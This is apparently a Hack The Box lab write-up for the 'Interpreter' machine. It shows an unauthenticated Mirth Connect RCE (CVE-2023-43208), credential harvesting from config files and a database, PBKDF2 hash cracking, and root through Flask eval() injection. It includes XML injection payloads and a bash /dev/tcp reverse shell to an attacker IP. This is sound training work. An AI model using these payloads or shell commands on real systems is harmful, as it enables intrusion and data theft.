# Interpreter

**Target IP:** `10.129.6.65` 
**Hostname:** `interpreter.htb` 
**Platform:** `Linux` 
**Difficulty:** `Easy`

---

## 1. Enumeration

### Port Scan

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

We have two web services (HTTP and HTTPS) and SSH.

### Web Reconnaissance

Visiting port 80 we see a website hosting NextGen Healthcare by Mirth Connect. There are options to download a launcher and to launch it. On the right there is a login panel which appears to require HTTPS.

![Pasted image 20260224140526.png](Pasted%20image%2020260224140526.png)

Visiting the HTTPS site we can attempt to login.

Subdomain enumeration:

```bash
ffuf -c -u http://10.129.6.65 -H "Host: FUZZ.interpreter.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

All results return 200, so we filter by length instead:

```bash
ffuf -c -u http://10.129.6.65 -H "Host: FUZZ.interpreter.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fl 82
```

![Pasted image 20260224101843.png](Pasted%20image%2020260224101843.png)

Nothing found.

Directory fuzzing:

```bash
feroxbuster -u http://interpreter.htb
```

![Pasted image 20260224101959.png](Pasted%20image%2020260224101959.png)

This finds `/webadmin` and `/installers` which may be interesting. A second scan reveals `/api` but nothing else:

![Pasted image 20260224102501.png](Pasted%20image%2020260224102501.png)

### Version Detection

A quick search for Mirth Connect reveals several historical exploits, including a notable one referenced by the NHS:

![Pasted image 20260224102140.png](Pasted%20image%2020260224102140.png)

The version can be determined via:

```bash
curl -k -H 'X-Requested-With: OpenAPI' https://interpreter.htb:443/api/server/version
```

This returns version `4.4.0`:

![Pasted image 20260224103838.png](Pasted%20image%2020260224103838.png)

---

## 2. Initial Foothold — CVE-2023-43208

Version 4.4.0 is confirmed vulnerable to CVE-2023-43208, an unauthenticated RCE affecting Mirth Connect.

**Reference / PoC:** https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT

### Exploitation

With a Penelope listener running, we fire off the PoC:

```bash
python3 CVE-2023-43208.py --url 'https://interpreter.htb:443/' --lhost 10.10.15.53 --lport 4444
```

![Pasted image 20260224104422.png](Pasted%20image%2020260224104422.png)

We receive a shell, which Penelope auto-upgrades:

![Pasted image 20260224104448.png](Pasted%20image%2020260224104448.png)

We are running as user `mirth`. There is a user `sedric` in `/home` but we do not have access.

![Pasted image 20260224104530.png](Pasted%20image%2020260224104530.png)

---

## 3. Credential Harvesting

### Mirth Properties

In `/usr/local/mirthconnect/conf/mirth.properties` we find a database URL and credentials:

```
database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

We also find keystore information:

```
keystore.path      = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass   = tAuJfQeXdnPw
keystore.type      = JCEKS
```

![Pasted image 20260224104720.png](Pasted%20image%2020260224104720.png)

### Database Enumeration

We connect to the database using the harvested credentials:

```bash
mysql -u mirthdb -p
```

![Pasted image 20260224104946.png](Pasted%20image%2020260224104946.png)

```sql
USE mc_bdd_prod;
SHOW TABLES;
```

![Pasted image 20260224105058.png](Pasted%20image%2020260224105058.png)

`PERSON_PASSWORD` appears interesting. Querying it reveals a password hash for `PERSON_ID` 2, which cross-references to `sedric` in the `PERSON` table:

![Pasted image 20260224105225.png](Pasted%20image%2020260224105225.png)

```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

### Hash Analysis & Cracking

The hash appears to be base64-encoded. Reviewing the Mirth Connect source code on GitHub reveals the hashing scheme:

**Reference:** https://github.com/nextgenhealthcare/connect/blob/development/core-util/src/com/mirth/commons/encryption/Digester.java

The algorithm uses PBKDF2WithHmacSHA256 with 600,000 iterations and an 8-byte salt prepended to the digest:

![Pasted image 20260224114109.png](Pasted%20image%2020260224114109.png) ![Pasted image 20260224114624.png](Pasted%20image%2020260224114624.png) ![Pasted image 20260224114415.png](Pasted%20image%2020260224114415.png) ![Pasted image 20260224115941.png](Pasted%20image%2020260224115941.png)

We can reformat this into a hashcat-compatible mode 10900 string using the following script:

```python
import base64
raw = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
salt, digest = raw[:8], raw[8:]
print(f"sha256:600000:{base64.b64encode(salt).decode()}:{base64.b64encode(digest).decode()}")
```

This gives us:

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

We crack this with hashcat:

```bash
hashcat sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps= /usr/share/wordlists/rockyou.txt
```

![Pasted image 20260224131408.png](Pasted%20image%2020260224131408.png)

`sedric`:`snowflake1`

---

## 4. User Shell

We SSH in with the cracked credentials and grab the user flag:

```bash
ssh sedric@interpreter.htb
```

![Pasted image 20260224131514.png](Pasted%20image%2020260224131514.png)

`sudo -l` reveals we cannot run sudo:

![Pasted image 20260224131758.png](Pasted%20image%2020260224131758.png)

---

## 5. Privilege Escalation — Flask eval() Injection

### Enumeration

Running LinPEAS highlights an internal service on port `54321`. We also identify a Python process running as root:

```bash
ps -aux
```

![Pasted image 20260224133844.png](Pasted%20image%2020260224133844.png)

### Reviewing the Service

The process is a Flask application — a notification server for patient records. Crucially, it passes user-controlled input directly into an `eval()` call via an f-string:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
try:
    return eval(f"f'''{template}'''")
```

The service only accepts requests from `127.0.0.1`, so we transfer a prebuilt `curl` binary to the box to interact with it.

A valid baseline request looks like:

```bash
./curl -s -X POST http://127.0.0.1:54321/addPatient \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><patient><firstname>John</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
```

![Pasted image 20260224135559.png](Pasted%20image%2020260224135559.png)

### Vulnerability Analysis

The `template()` function validates input with a regex, blocking characters such as spaces and colons, but the validated input is then injected directly into an f-string and passed to `eval()`. Any Python expression wrapped in `{}` within an allowed field will execute.

**Initial PoC — command execution:**

```bash
./curl -s -X POST http://127.0.0.1:54321/addPatient \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><patient><firstname>{__import__("os").popen("id").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
```

![Pasted image 20260224135643.png](Pasted%20image%2020260224135643.png)

**Reading the root flag directly:**

```bash
./curl -s -X POST http://127.0.0.1:54321/addPatient \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
```

![Pasted image 20260224140346.png](Pasted%20image%2020260224140346.png)

### Building the Final Exploit

Since spaces are blocked, we write a reverse shell script to disk and invoke it via the injection:

```bash
# Write reverse shell to disk
cat > /tmp/exploit.sh << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.15.53/4444 0>&1
EOF
chmod +x /tmp/exploit.sh
```

```bash
./curl -s -X POST http://127.0.0.1:54321/addPatient \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><patient><firstname>{__import__("os").popen("/tmp/exploit.sh").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
```

We receive a root shell on our Penelope listener:

![Pasted image 20260224141940.png](Pasted%20image%2020260224141940.png)

### Alternative Path (Root Before User)

It is technically possible to perform privilege escalation before cracking the user hash, as the `addPatient` endpoint is accessible from the `mirth` shell. The required XML template can be retrieved from the database:

```sql
SELECT * FROM CHANNEL;
```

![Pasted image 20260224143303.png](Pasted%20image%2020260224143303.png)

This reveals the HL7 and XML templates used by MirthConnect, providing the structure needed to craft a valid request without ever needing `sedric`'s credentials.

---

## Summary

|Step|Technique|
|---|---|
|Initial access|CVE-2023-43208 — Unauthenticated RCE in Mirth Connect 4.4.0, shell as `mirth`|
|Credential access|MariaDB enumeration via harvested DB credentials — PBKDF2 hash cracked with hashcat (mode 10900), yielding `sedric:snowflake1`|
|User shell|SSH login with cracked credentials|
|Privilege escalation|Python `eval()` injection in root-owned Flask service — reverse shell via pre-written script to bypass regex restrictions|